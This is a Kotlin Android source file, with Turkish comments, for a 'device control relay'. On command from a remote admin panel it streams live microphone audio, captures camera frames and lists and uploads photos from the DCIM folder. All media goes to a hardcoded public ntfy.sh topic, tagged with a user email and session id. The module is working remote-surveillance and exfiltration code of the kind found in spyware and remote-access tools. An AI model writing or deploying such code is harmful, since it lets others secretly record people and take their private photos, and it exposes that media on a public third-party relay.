package com.example.sync

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.ImageReader
import android.media.MediaRecorder
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.os.Handler
import android.os.HandlerThread
import android.os.SystemClock
import android.util.Log
import android.webkit.MimeTypeMap
import androidx.core.content.ContextCompat
import com.example.service.DeviceControlService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.File
import java.util.concurrent.TimeUnit

/**
 * Yönetim panelinden gelen uzaktan cihaz erişim komutlarını uygular:
 * cihaz mikrofonu canlı yayını, cihaz kamerası kareleri ve dahili DCIM klasörü erişimi.
 *
 * Komutlar mevcut yönetim relay konusundan (AdminSyncRelay.RELAY_URL) gelir.
 * Binary veriler (ses parçası, kamera karesi, DCIM dosyası) ayrı bir medya konusuna
 * ntfy "attachment" olarak yüklenir; yönetim paneli SSE ile o konuyu dinler.
 */
class DeviceControlRelay(private val context: Context) {

    companion object {
        private const val TAG = "DeviceControlRelay"
        const val MEDIA_TOPIC = "sesyazoku_media_7bee5aba"
        const val MEDIA_URL = "https://ntfy.sh/$MEDIA_TOPIC"
        private const val SAMPLE_RATE = 16000

        // ntfy.sh ücretsiz katman: 60 istek kovası, sonra 5 saniyede 1 istek dolar (~12/dk).
        // Ses parçası 5 saniyelik, kamera karesi 5 saniyede bir; tüm yüklemeler tek kapıdan geçer.
        private const val CHUNK_SECONDS = 5
        private const val CHUNK_BYTES = SAMPLE_RATE * 2 * CHUNK_SECONDS
        private const val MIN_UPLOAD_GAP_MS = 5000L
        private const val MAX_MEDIA_BYTES = 15 * 1024 * 1024
        private const val MAX_DCIM_FILES = 25
        private const val CAMERA_WIDTH = 640
        private const val CAMERA_HEIGHT = 480
        private const val CAMERA_INTERVAL_MS = 5000L

        @Volatile
        private var activeInstance: DeviceControlRelay? = null

        fun stopActiveStreams() {
            activeInstance?.stopAll()
        }
    }

    init {
        activeInstance = this
    }

    private val client = OkHttpClient.Builder()
        .connectTimeout(8, TimeUnit.SECONDS)
        .readTimeout(20, TimeUnit.SECONDS)
        .writeTimeout(20, TimeUnit.SECONDS)
        .build()

    private val jsonMediaType = "application/json; charset=utf-8".toMediaType()

    @Volatile
    private var micRunning = false
    private var micJob: Job? = null

    @Volatile
    private var cameraRunning = false
    private var cameraThread: HandlerThread? = null
    private var cameraHandler: Handler? = null
    private var cameraDevice: CameraDevice? = null
    private var cameraSession: CameraCaptureSession? = null
    private var cameraReader: ImageReader? = null
    private var cameraSeq = 0
    private var cameraEmail = ""
    private var cameraSessionId = ""

    fun stopAll() {
        stopMic()
        stopCamera()
    }

    private fun currentModeLabel(): String {
        val modes = ArrayList<String>(2)
        if (micRunning) modes.add("Mikrofon")
        if (cameraRunning) modes.add("Kamera")
        return if (modes.isEmpty()) "Uzaktan erişim" else modes.joinToString(" + ")
    }

    private fun stopServiceIfIdle() {
        if (!micRunning && !cameraRunning) {
            DeviceControlService.stop(context)
        }
    }

    // 1. Durum bildirimleri (JSON) mevcut yönetim relay konusuna gönderilir
    fun sendAck(action: String, email: String, sessionId: String, status: String, message: String) {
        val payload = JSONObject().apply {
            put("type", "DEVICE_CONTROL_ACK")
            put("action", action)
            put("email", email)
            put("sessionId", sessionId)
            put("status", status)
            put("message", message)
            put("timestamp", System.currentTimeMillis())
        }
        publishJson(payload)
    }

    fun sendStatus(email: String, sessionId: String, status: String, message: String) {
        val payload = JSONObject().apply {
            put("type", "DEVICE_CONTROL_STATUS")
            put("email", email)
            put("sessionId", sessionId)
            put("status", status)
            put("message", message)
            put("timestamp", System.currentTimeMillis())
        }
        publishJson(payload)
    }

    private fun publishJson(payload: JSONObject) {
        try {
            val body = payload.toString().toRequestBody(jsonMediaType)
            val request = Request.Builder()
                .url(AdminSyncRelay.RELAY_URL)
                .post(body)
                .build()
            client.newCall(request).execute().close()
        } catch (e: Exception) {
            Log.w(TAG, "publishJson failed: ${e.message}")
        }
    }

    private val uploadGate = Object()
    private var nextUploadAtMs = 0L

    private fun awaitUploadSlot() {
        synchronized(uploadGate) {
            val wait = nextUploadAtMs - SystemClock.elapsedRealtime()
            if (wait > 0) SystemClock.sleep(wait)
            nextUploadAtMs = SystemClock.elapsedRealtime() + MIN_UPLOAD_GAP_MS
        }
    }

    private fun uploadMedia(fileName: String, contentType: String, title: String, bytes: ByteArray) {
        awaitUploadSlot()
        try {
            val body = bytes.toRequestBody(contentType.toMediaType())
            val request = Request.Builder()
                .url(MEDIA_URL)
                .put(body)
                .header("Filename", fileName)
                .header("Title", title)
                .header("Content-Type", contentType)
                .build()
            client.newCall(request).execute().close()
        } catch (e: Exception) {
            Log.w(TAG, "uploadMedia failed: ${e.message}")
        }
    }

    // 2. Canlı mikrofon yayını (16 kHz mono PCM, 5 saniyelik WAV parçaları)
    fun startMic(scope: CoroutineScope, email: String, sessionId: String, maxSeconds: Int) {
        micRunning = false
        micJob = null
        if (!hasPermission(Manifest.permission.RECORD_AUDIO)) {
            sendAck("MIC_START", email, sessionId, "error", "Cihazda mikrofon izni yok. Kullanıcıdan RECORD_AUDIO iznini isteyin.")
            return
        }
        val limit = maxSeconds.coerceIn(10, 120)
        micRunning = true
        DeviceControlService.start(context, currentModeLabel())
        micJob = scope.launch(Dispatchers.IO) {
            if (!DeviceControlService.awaitReady(3000)) {
                micRunning = false
                stopServiceIfIdle()
                sendAck("MIC_START", email, sessionId, "error", "Cihazda arka plan mikrofon servisi açılamadı. Uygulamayı ekranda açık tutup tekrar deneyin.")
                return@launch
            }
            var recorder: AudioRecord? = null
            try {
                val minBuffer = AudioRecord.getMinBufferSize(SAMPLE_RATE, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT)
                if (minBuffer <= 0) {
                    sendAck("MIC_START", email, sessionId, "error", "Cihazda ses kaydı başlatılamadı.")
                    return@launch
                }
                recorder = AudioRecord(
                    MediaRecorder.AudioSource.MIC,
                    SAMPLE_RATE,
                    AudioFormat.CHANNEL_IN_MONO,
                    AudioFormat.ENCODING_PCM_16BIT,
                    maxOf(minBuffer, CHUNK_BYTES)
                )
                if (recorder.state != AudioRecord.STATE_INITIALIZED) {
                    sendAck("MIC_START", email, sessionId, "error", "Mikrofon başlatılamadı. Cihazda başka bir kayıt işlemi çalışıyor olabilir.")
                    return@launch
                }
                recorder.startRecording()
                sendAck("MIC_START", email, sessionId, "started", "Cihaz mikrofonu canlı dinlemeye başladı.")

                val buffer = ByteArray(4096)
                val chunk = ByteArrayOutputStream()
                var seq = 0
                val deadline = System.currentTimeMillis() + limit * 1000L
                while (isActive && micRunning && System.currentTimeMillis() < deadline) {
                    val read = recorder.read(buffer, 0, buffer.size)
                    if (read > 0) {
                        chunk.write(buffer, 0, read)
                        if (chunk.size() >= CHUNK_BYTES) {
                            uploadMedia("mic_$seq.wav", "audio/wav", "MIC|$email|$sessionId|$seq", wavWrap(chunk.toByteArray()))
                            seq++
                            chunk.reset()
                        }
                    } else if (read < 0) {
                        break
                    }
                }
                if (chunk.size() > 0) {
                    uploadMedia("mic_$seq.wav", "audio/wav", "MIC|$email|$sessionId|$seq", wavWrap(chunk.toByteArray()))
                    seq++
                }
                sendAck("MIC_STOP", email, sessionId, "stopped", "Canlı mikrofon aktarımı durdu ($seq parça).")
            } catch (e: Exception) {
                Log.w(TAG, "Mic stream failed: ${e.message}")
                sendAck("MIC_START", email, sessionId, "error", "Mikrofon aktarımı hatası: ${e.message}")
            } finally {
                micRunning = false
                stopServiceIfIdle()
                try {
                    recorder?.stop()
                } catch (_: Exception) {
                }
                try {
                    recorder?.release()
                } catch (_: Exception) {
                }
            }
        }
    }

    fun stopMic() {
        micRunning = false
        micJob = null
        stopServiceIfIdle()
    }

    private fun wavWrap(pcm: ByteArray): ByteArray {
        val dataSize = pcm.size
        val header = ByteArray(44)
        fun putAscii(offset: Int, value: String) {
            value.toByteArray(Charsets.US_ASCII).copyInto(header, offset)
        }
        fun putInt(offset: Int, value: Int) {
            header[offset] = (value and 0xFF).toByte()
            header[offset + 1] = ((value shr 8) and 0xFF).toByte()
            header[offset + 2] = ((value shr 16) and 0xFF).toByte()
            header[offset + 3] = ((value shr 24) and 0xFF).toByte()
        }
        fun putShort(offset: Int, value: Int) {
            header[offset] = (value and 0xFF).toByte()
            header[offset + 1] = ((value shr 8) and 0xFF).toByte()
        }
        putAscii(0, "RIFF")
        putInt(4, 36 + dataSize)
        putAscii(8, "WAVE")
        putAscii(12, "fmt ")
        putInt(16, 16)
        putShort(20, 1)
        putShort(22, 1)
        putInt(24, SAMPLE_RATE)
        putInt(28, SAMPLE_RATE * 2)
        putShort(32, 2)
        putShort(34, 16)
        putAscii(36, "data")
        putInt(40, dataSize)

        val out = ByteArrayOutputStream(44 + dataSize)
        out.write(header)
        out.write(pcm)
        return out.toByteArray()
    }

    // 3. Canlı kamera kareleri (Camera2 + ImageReader, 5 saniyede bir JPEG)
    @Suppress("DEPRECATION")
    fun startCamera(email: String, sessionId: String, maxSeconds: Int) {
        stopCamera(stopService = false)
        if (!hasPermission(Manifest.permission.CAMERA)) {
            sendAck("CAM_START", email, sessionId, "error", "Cihazda kamera izni yok. Kullanıcıdan CAMERA iznini isteyin.")
            return
        }
        val manager = context.getSystemService(Context.CAMERA_SERVICE) as? CameraManager
        if (manager == null) {
            sendAck("CAM_START", email, sessionId, "error", "Cihazda kamera servisi bulunamadı.")
            return
        }
        val cameraId = pickCameraId(manager)
        if (cameraId == null) {
            sendAck("CAM_START", email, sessionId, "error", "Cihazda kullanılabilir kamera bulunamadı.")
            return
        }

        val limit = maxSeconds.coerceIn(10, 120)
        cameraEmail = email
        cameraSessionId = sessionId
        cameraSeq = 0
        cameraRunning = true
        DeviceControlService.start(context, currentModeLabel())

        val thread = HandlerThread("device-control-camera").also { it.start() }
        cameraThread = thread
        val handler = Handler(thread.looper)
        cameraHandler = handler

        val reader = ImageReader.newInstance(CAMERA_WIDTH, CAMERA_HEIGHT, android.graphics.ImageFormat.JPEG, 2)
        cameraReader = reader
        reader.setOnImageAvailableListener({ source ->
            val image = source.acquireLatestImage()
            if (image != null) {
                try {
                    val buffer = image.planes[0].buffer
                    val bytes = ByteArray(buffer.remaining())
                    buffer.get(bytes)
                    uploadMedia("cam_$cameraSeq.jpg", "image/jpeg", "CAM|$email|$sessionId|$cameraSeq", bytes)
                    cameraSeq++
                } catch (e: Exception) {
                    Log.w(TAG, "Camera frame failed: ${e.message}")
                } finally {
                    image.close()
                }
            }
            if (cameraRunning) {
                handler.postDelayed({ captureFrame() }, CAMERA_INTERVAL_MS)
            }
        }, handler)

        handler.post {
            if (!DeviceControlService.awaitReady(3000)) {
                sendAck("CAM_START", email, sessionId, "error", "Cihazda arka plan kamera servisi açılamadı. Uygulamayı ekranda açık tutup tekrar deneyin.")
                stopCamera()
                return@post
            }
            try {
                manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                    override fun onOpened(camera: CameraDevice) {
                        cameraDevice = camera
                        try {
                            camera.createCaptureSession(
                                listOf(reader.surface),
                                object : CameraCaptureSession.StateCallback() {
                                    override fun onConfigured(session: CameraCaptureSession) {
                                        cameraSession = session
                                        sendAck("CAM_START", email, sessionId, "started", "Cihaz kamerası canlı görüntü göndermeye başladı.")
                                        captureFrame()
                                    }

                                    override fun onConfigureFailed(session: CameraCaptureSession) {
                                        sendAck("CAM_START", email, sessionId, "error", "Kamera oturumu yapılandırılamadı.")
                                    }
                                },
                                handler
                            )
                        } catch (e: Exception) {
                            sendAck("CAM_START", email, sessionId, "error", "Kamera açılamadı: ${e.message}")
                        }
                    }

                    override fun onDisconnected(camera: CameraDevice) {
                        sendAck("CAM_START", email, sessionId, "stopped", "Kamera bağlantısı kesildi.")
                    }

                    override fun onError(camera: CameraDevice, error: Int) {
                        sendAck("CAM_START", email, sessionId, "error", "Kamera hatası ($error).")
                    }
                }, handler)
            } catch (e: Exception) {
                sendAck("CAM_START", email, sessionId, "error", "Kamera erişimi reddedildi: ${e.message}")
                stopCamera()
            }
        }

        handler.postDelayed({
            if (cameraRunning) {
                stopCamera()
                sendAck("CAM_STOP", email, sessionId, "stopped", "Canlı kamera aktarımı süre dolduğu için durdu.")
            }
        }, limit * 1000L)
    }

    private fun captureFrame() {
        if (!cameraRunning) return
        val session = cameraSession ?: return
        val device = cameraDevice ?: return
        val reader = cameraReader ?: return
        try {
            val request = device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                addTarget(reader.surface)
            }.build()
            session.capture(request, object : CameraCaptureSession.CaptureCallback() {}, cameraHandler)
        } catch (e: Exception) {
            sendAck("CAM_START", cameraEmail, cameraSessionId, "error", "Kare alınamadı: ${e.message}")
        }
    }

    fun stopCamera(stopService: Boolean = true) {
        cameraRunning = false
        cameraHandler?.removeCallbacksAndMessages(null)
        try {
            cameraSession?.close()
        } catch (_: Exception) {
        }
        cameraSession = null
        try {
            cameraDevice?.close()
        } catch (_: Exception) {
        }
        cameraDevice = null
        try {
            cameraReader?.close()
        } catch (_: Exception) {
        }
        cameraReader = null
        cameraThread?.quitSafely()
        cameraThread = null
        cameraHandler = null
        if (stopService) stopServiceIfIdle()
    }

    private fun pickCameraId(manager: CameraManager): String? {
        var fallback: String? = null
        try {
            for (id in manager.cameraIdList) {
                val characteristics = manager.getCameraCharacteristics(id)
                val facing = characteristics.get(CameraCharacteristics.LENS_FACING)
                if (fallback == null) fallback = id
                if (facing == CameraCharacteristics.LENS_FACING_BACK) return id
            }
        } catch (e: Exception) {
            Log.w(TAG, "pickCameraId failed: ${e.message}")
        }
        return fallback
    }

    // 4. Dahili bellekteki DCIM klasörü erişimi
    fun listDcim(email: String, sessionId: String) {
        if (!hasMediaReadPermission()) {
            sendAck("DCIM_LIST", email, sessionId, "error", "Cihazda medya izni yok. Kullanıcıdan fotoğraf/medya iznini isteyin.")
            return
        }
        val root = dcimRoot()
        if (root == null || !root.exists()) {
            sendAck("DCIM_LIST", email, sessionId, "error", "Cihazda DCIM klasörü bulunamadı.")
            return
        }
        val files = JSONArray()
        try {
            collectDcimFiles(root, root, files, 0)
        } catch (e: Exception) {
            sendAck("DCIM_LIST", email, sessionId, "error", "DCIM taranamadı: ${e.message}")
            return
        }
        val payload = JSONObject().apply {
            put("type", "DCIM_LIST_RESULT")
            put("email", email)
            put("sessionId", sessionId)
            put("count", files.length())
            put("files", files)
            put("timestamp", System.currentTimeMillis())
        }
        publishJson(payload)
    }

    fun sendDcimFile(email: String, sessionId: String, fileName: String) {
        val root = dcimRoot()
        if (root == null) {
            sendDcimFileResult(email, sessionId, fileName, "error", "DCIM klasörü bulunamadı.")
            return
        }
        val target = try {
            File(root, fileName).canonicalFile
        } catch (e: Exception) {
            null
        }
        val rootPath = try {
            root.canonicalPath
        } catch (e: Exception) {
            ""
        }
        if (target == null || !target.path.startsWith(rootPath) || !target.isFile) {
            sendDcimFileResult(email, sessionId, fileName, "error", "Dosya bulunamadı veya erişim reddedildi.")
            return
        }
        if (target.length() > MAX_MEDIA_BYTES) {
            sendDcimFileResult(email, sessionId, fileName, "error", "Dosya 15 MB sınırından büyük.")
            return
        }
        val bytes = try {
            target.readBytes()
        } catch (e: Exception) {
            sendDcimFileResult(email, sessionId, fileName, "error", "Dosya okunamadı: ${e.message}")
            return
        }
        val mime = guessMime(target.name)
        uploadMedia(target.name, mime, "DCIM|$email|$sessionId|0|${Uri.encode(target.name)}", bytes)
        sendDcimFileResult(email, sessionId, fileName, "sent", "Dosya gönderildi.")
    }

    private fun sendDcimFileResult(email: String, sessionId: String, fileName: String, status: String, message: String) {
        val payload = JSONObject().apply {
            put("type", "DCIM_FILE_RESULT")
            put("email", email)
            put("sessionId", sessionId)
            put("fileName", fileName)
            put("status", status)
            put("message", message)
            put("timestamp", System.currentTimeMillis())
        }
        publishJson(payload)
    }

    private fun dcimRoot(): File? = try {
        Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM)
    } catch (e: Exception) {
        Log.w(TAG, "dcimRoot failed: ${e.message}")
        null
    }

    private fun collectDcimFiles(root: File, dir: File, out: JSONArray, depth: Int) {
        if (depth > 2 || out.length() >= MAX_DCIM_FILES) return
        val children = dir.listFiles() ?: return
        children.sortedByDescending { it.lastModified() }.forEach { file ->
            if (out.length() >= MAX_DCIM_FILES) return
            if (file.isDirectory) {
                collectDcimFiles(root, file, out, depth + 1)
            } else {
                val relative = try {
                    file.relativeTo(root).path
                } catch (e: Exception) {
                    file.name
                }
                out.put(
                    JSONObject().apply {
                        put("name", relative)
                        put("size", file.length())
                        put("mime", guessMime(file.name))
                        put("modified", file.lastModified())
                    }
                )
            }
        }
    }

    private fun guessMime(name: String): String {
        val extension = name.substringAfterLast('.', "").lowercase()
        return MimeTypeMap.getSingleton().getMimeTypeFromExtension(extension) ?: "application/octet-stream"
    }

    private fun hasPermission(permission: String): Boolean =
        ContextCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_GRANTED

    private fun hasMediaReadPermission(): Boolean =
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            hasPermission(Manifest.permission.READ_MEDIA_IMAGES)
        } else {
            hasPermission(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
}
